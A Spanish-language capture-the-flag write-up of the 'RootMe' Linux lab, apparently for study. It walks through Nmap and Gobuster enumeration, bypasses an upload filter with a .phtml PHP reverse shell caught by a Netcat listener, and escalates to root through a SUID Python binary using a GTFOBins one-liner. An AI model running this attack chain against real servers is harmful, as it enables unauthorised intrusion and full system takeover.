# RootMe

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux explotando una vulnerabilidad de **File Upload** para obtener una **Remote Code Execution (RCE)**, estabilizar la shell obtenida y escalar privilegios aprovechando un binario **SUID** hasta conseguir acceso como **root**.

---

## 🛠️ Tecnologías trabajadas

- Gobuster
- File Upload
- PHP Reverse Shell
- Netcat
- TTY Treatment
- SUID
- Python
- GTFOBins

---

## 🧠 Metodología

La enumeración inicial mostró únicamente dos servicios: **SSH** y **HTTP**. Al no disponer de credenciales para SSH, toda la investigación se centró en la aplicación web.

La enumeración de directorios reveló dos recursos especialmente interesantes: un panel para subir archivos y otro directorio desde el que esos archivos podían ejecutarse. Esta combinación indicaba un posible vector de **Remote Code Execution**, por lo que el objetivo pasó a ser encontrar una forma de superar las restricciones de subida de archivos.

Aunque el servidor bloqueaba los archivos con extensión `.php`, asumí que la validación probablemente se realizaba únicamente sobre la extensión. Tras probar formatos alternativos compatibles con PHP conseguí subir una reverse shell utilizando la extensión `.phtml`.

Una vez comprometido el sistema, estabilicé la shell para trabajar de forma más cómoda y comencé la enumeración interna. La búsqueda de binarios SUID permitió localizar un intérprete de Python vulnerable que podía utilizarse para obtener una shell privilegiada sin necesidad de explotar vulnerabilidades adicionales.

Este laboratorio demuestra cómo una mala validación de archivos subidos y una configuración insegura de permisos pueden comprometer completamente un servidor.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un escaneo completo mediante Nmap.

```bash
nmap -p- 10.130.176.16
```

Los servicios identificados fueron:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |

Posteriormente profundicé en los servicios detectados.

```bash
nmap -sC -sV -p22,80 10.130.176.16
```

La enumeración confirmó:

- Apache **2.4.41**
- Servicio **SSH** activo

---

### 2. Enumeración web

Accedí a la aplicación web y realicé una enumeración de directorios utilizando Gobuster.

```bash
gobuster dir -u http://10.130.176.16 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

Los recursos más relevantes fueron:

```
/panel
```

```
/uploads
```

El primero permitía subir archivos al servidor, mientras que el segundo los exponía públicamente, convirtiéndose en un posible vector de ejecución remota de código.

---

### 3. Explotación del File Upload

El servidor impedía subir archivos con extensión:

```
.php
```

Sin embargo, aceptaba archivos con extensión:

```
.phtml
```

Aprovechando este comportamiento preparé una **reverse shell** en PHP utilizando dicha extensión.

Preparé un listener con Netcat.

```bash
nc -lvnp 1234
```

Posteriormente ejecuté el archivo accediendo desde el navegador a:

```text
http://10.130.176.16/uploads/php-reverse-shell.phtml
```

La conexión se estableció correctamente y obtuve una shell sobre la máquina víctima.

---

### 4. Estabilización de la shell

La shell inicial era limitada, por lo que realicé el tratamiento habitual de la TTY.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Posteriormente configuré correctamente el terminal.

```bash
stty raw -echo
reset xterm
export TERM=xterm
```

Tras estos pasos obtuve una shell completamente interactiva.

---

### 5. Enumeración interna

Comencé buscando la primera flag del laboratorio.

```bash
find / -name "user.txt" 2>/dev/null
```

La búsqueda devolvió:

```
/var/www/user.txt
```

Desde esta ubicación recuperé la primera flag.

---

### 6. Escalada de privilegios

El siguiente paso consistió en enumerar los binarios SUID.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Entre ellos apareció:

```
/usr/bin/python2.7
```

Consultando GTFOBins comprobé que era posible utilizar Python para conservar privilegios elevados.

Ejecuté:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

El comando proporcionó inmediatamente una shell como **root**.

Finalmente recuperé la última flag:

```
/root/root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió practicar una cadena de explotación muy habitual en auditorías web: subida de archivos, obtención de una shell y escalada mediante binarios SUID.
- Detectar vulnerabilidades de **File Upload**.
- Comprender por qué Apache ejecuta archivos con extensión `.phtml`.
- Obtener una **Remote Code Execution** mediante una reverse shell en PHP.
- Estabilizar una shell interactiva utilizando Python y la configuración del terminal.
- Buscar archivos relevantes mediante `find`.
- Enumerar binarios **SUID** tras obtener acceso inicial.
- Escalar privilegios utilizando un intérprete de Python con permisos SUID.
